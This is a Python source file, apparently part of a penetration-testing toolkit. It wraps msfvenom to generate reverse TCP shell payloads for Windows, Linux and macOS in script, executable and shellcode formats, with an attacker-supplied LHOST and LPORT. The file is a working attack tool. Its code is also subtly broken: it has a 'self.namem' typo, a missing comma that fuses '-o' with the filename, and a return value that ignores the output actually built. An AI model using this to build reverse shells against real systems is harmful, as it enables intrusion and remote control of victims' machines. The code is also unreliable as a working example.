import subprocess
import random


class Artifact_generator:
    def __init__(self, os, style, extension, ip, port, encoding, output):

        self.os = os
        self.style = style
        self.output = output
        self.encoding = encoding
        self.extension = extension

        self.ip = ip
        self.port = port
        self.name = "artifact_"
        
        # TODO explore other options here aswell
        self.available_platforms = [
            "windows/x64/shell_reverse_tcp",
            "windows/x32/shell_reverse_tcp",
            "linux/x64/shell_reverse_tcp",
            "linux/x32/shell_reverse_tcp"
        ]
        
        # TODO add conversion between formats
        self.available_script_formats = {
            "ps1"  : "powershell",
            "py"   : "python",
            "pl"   : "perl",
            "sh"   : "bash",
            "js"   : "js",
            "asp"  : "asp",
            "jsp"  : "jsp",
            "war"  : "war",
            "php"  : "php",
            "html" : "html"
        }

        self.available_executable_formats = {
            "exe"   : "exe",
            "elf"   : "elf",
            "macho" : "macho"
        }

        self.available_shellcode_formats = {
            "raw"      : "raw",
            "msi"      : "msi",
            "vba"      : "vba",
            "vbscript" : "vbscript"
        }
        
        for platform in self.available_platforms:
            if self.os in platform:
                self.os = platform

    def msfvenom_generator(self):
        """ Generates the artifact using msfvenom """

        # Creates a random numbered name #
        for _ in range(6):
            self.name+=str(random.randint(0,9))
        
        if self.output == 'sc':
            command = [
                "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}",
                "-f", f"{self.available_script_formats[self.extension]}", 
                "-v", f"{self.output}", "-o" f"{self.name}.shellcode" 
            ]        
        elif self.extension == 'exe':
            command = [
               "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}", 
               "-f", f"{self.available_executable_formats[self.extension]}",
               "-o", f"{self.namem}.{self.extension}"
            ]
        elif self.extension == 'elf':
            command = [
               "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}", 
               "-f", f"{self.available_executable_formats[self.extension]}",
               "-o", f"{self.namem}.{self.extension}"
            ]
        elif self.extension == 'macho':
            command = [
               "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}", 
               "-f", f"{self.available_executable_formats[self.extension]}",
               "-o", f"{self.namem}.{self.extension}"
            ]

        process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        return f"{self.name}.shellcode"


if __name__ == '__main__':
    pass
